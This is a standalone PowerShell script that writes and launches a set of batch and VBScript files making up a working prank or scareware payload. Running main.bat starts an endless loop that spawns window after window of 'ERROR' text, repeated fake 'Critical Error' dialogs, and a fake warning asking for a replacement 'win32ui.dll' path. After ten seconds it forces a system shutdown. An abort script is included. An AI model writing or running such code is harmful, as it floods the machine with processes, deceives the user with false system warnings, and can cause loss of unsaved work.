# Load scripts if not present
if(-Not (Test-Path 'tmp\main.bat')) {
    # Create a directory to store scripts
    New-Item 'tmp' -ItemType 'directory'

    # Create a test file to check write permissions
    New-Item 'test' -ItemType 'file'

    # Notify the user an error has occurred and exit if the directory was unable to be created
    if(-not (Test-Path 'tmp') -or -not (Test-Path 'test')) {
        [System.Windows.MessageBox]::Show('Unable to load scripts. Please try running this application in a different directory.','Error','OK','Error')
        Exit
    }

    # Remove test file if able to write
    Remove-Item 'test'

    # Navigate to the directory and load files
    Set-Location 'tmp'
    Add-Content main.bat (
        '@echo off',
        'call sub0.bat',
        '',
        'start sub1.bat',
        '',
        ':loop',
        'set /a x=%random% %% 23000',
        'set /a y=%random% %% 13000',
        'echo a=InputBox("Warning: The following file critical to system operation is missing or corrupted: win32ui.dll. Please enter the filepath for a replacement immediately.","Critical Warning", "C:\Windows\System32\win32ui.dll", %x%, %y%) > sub4.vbs',
        '',
        'start sub2.bat',
        'start sub3.vbs',
        'start sub4.vbs',
        'goto loop'
    )
    Add-Content sub0.bat (
        '@echo off',
        'setlocal enabledelayedexpansion',
        '',
        'set str=ERROR',
        'for /l %%i in (1, 1, 19) do set str=!str! %str%',
        '',
        'title %str%',
        'for /l %%i in (1, 1, 30) do echo %str%'
    )
    Add-Content sub1.bat (
        '@echo off',
        'call sub0.bat',
        '',
        'timeout /t 10 > nul',
        'shutdown -s -t 3'
    )
    Add-Content sub2.bat (
        '@echo off',
        'setlocal enabledelayedexpansion',
        'call sub0.bat',
        '',
        'set str=ERROR',
        'for /l %%i in (1, 1, 19) do set str=!str! %str%',
        '',
        ':loop','echo %str%',
        'set /a a = %random% %% 5',
        'timeout /t %a% > nul',
        'goto loop'
    )
    Add-Content sub3.vbs (
        'do',
        'x=MsgBox("A Critical Error has occured at 0x9d18af32. Please contact your system administrator for more information.", 16, "Critical Error")',
        'loop'
    )    
    Add-Content abort.bat (
        '@echo off',
        '',
        'shutdown /a',
        'taskkill /f /im wscript.exe',
        'taskkill /f /im cmd.exe'
    )

    # Navigate back to parent directory
    Set-Location '..'
}

# Release the kraken
Set-Location 'tmp'
Start-Process 'main.bat'
